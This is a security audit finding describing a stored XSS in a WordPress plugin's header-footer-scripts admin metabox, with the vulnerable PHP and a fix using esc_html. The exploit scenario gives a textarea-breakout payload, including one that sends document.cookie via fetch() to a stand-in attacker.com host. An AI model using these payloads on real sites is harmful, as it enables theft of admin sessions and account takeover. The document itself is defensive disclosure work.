# TC-001: Stored XSS via Unescaped Script Meta in Admin Metabox Textarea

## Severity: Low (CVSS 4.0 — multisite context)
## Vulnerability Class: Stored Cross-Site Scripting (XSS)
## Unauthenticated: No (requires unfiltered_html capability to plant)

## Location

- **File**: `obfx_modules/header-footer-scripts/init.php`
- **Line**: 299
- **Flow ID**: `themeisle-companion-xss-002`

## Description

The `render_control()` method displays stored post meta in an admin-side Scripts metabox. The meta value is echoed directly into the HTML output inside a `<textarea>` tag without HTML escaping:

```php
// Line 292-302
private function render_control( $post, $control_id, $control_settings ) {
    $post_meta = get_post_meta( $post->ID, $control_id, true );

    if ( $control_settings['type'] === 'textarea' ) {
        echo '<textarea class="widefat" rows="4" name="' . esc_attr( $control_id ) . '">';
        if ( ! empty( $post_meta ) ) {
            // phpcs:ignore
            echo $post_meta;  // <-- UNESCAPED OUTPUT
        }
        echo '</textarea>';
    }
    // ...
}
```

A value such as `</textarea><script>alert(document.cookie)</script>` would terminate the textarea element and execute arbitrary JavaScript in the context of the WordPress admin panel.

## Attack Prerequisites

1. **Planting the payload** requires `unfiltered_html` capability. In single-site WordPress, all administrators have this capability. In **multisite**, only super-admins have `unfiltered_html`; regular site admins do not.
2. **Triggering** the XSS requires any user who can edit posts or pages (editors, authors, or admins) to open the post editor. The metabox (`add_meta_box`) has no capability restriction and appears for all post/page editors.

## Write-Gate Analysis

`save_meta()` (line 320) checks `current_user_can('unfiltered_html')` before saving. The `check_post_metadata` filter (lines 143-153) also blocks non-`unfiltered_html` users from writing via the metadata API. The `is_meta_protected` filter (lines 122-132) marks these keys as protected for non-`unfiltered_html` users in the REST API and custom fields UI, but this filter does **not** block direct `get_post_meta()` calls — so the meta value is still retrieved and echoed for any user viewing the metabox.

## Exploit Scenario (Multisite)

1. Network super-admin saves the payload `</textarea><script>fetch('https://attacker.com/?c='+document.cookie)</script>` as the header scripts meta for a post.
2. Site admin (who lacks `unfiltered_html` and cannot overwrite the value) edits that post.
3. The Scripts metabox renders the unescaped meta, breaking out of the textarea.
4. The JavaScript executes in the site admin's browser session, stealing cookies or performing actions as that admin.

## Single-Site Impact

In standard single-site WordPress, all admins have `unfiltered_html`, making this admin-to-admin XSS. WordPress's security model treats admin-to-admin XSS as out of scope (won't-fix). This finding is primarily relevant in multisite configurations.

## Impact

- Admin session cookie theft
- Privilege escalation across multisite network boundaries (super-admin plants payload targeting site-admin)
- Arbitrary admin actions executed in victim's browser

## Remediation

Apply `esc_html()` before echoing the meta value in the textarea:

```php
// Fix:
echo esc_html( $post_meta );
```

Alternatively, use `htmlspecialchars()` to ensure `<`, `>`, `"`, `'`, and `&` are encoded before insertion into HTML context. The actual script content is still output unescaped by `do_header_scripts()` and `do_footer_scripts()` on the frontend (which is the intended behavior of the feature), so this fix only addresses the admin metabox rendering.

## Verification

The `phpcs:ignore` comment on line 298 confirms the developer was aware of the missing escape but suppressed the PHPCS warning, likely because the feature intentionally stores raw scripts. The distinction between admin-side metabox display (should escape) and frontend output (intentionally raw) was not made.
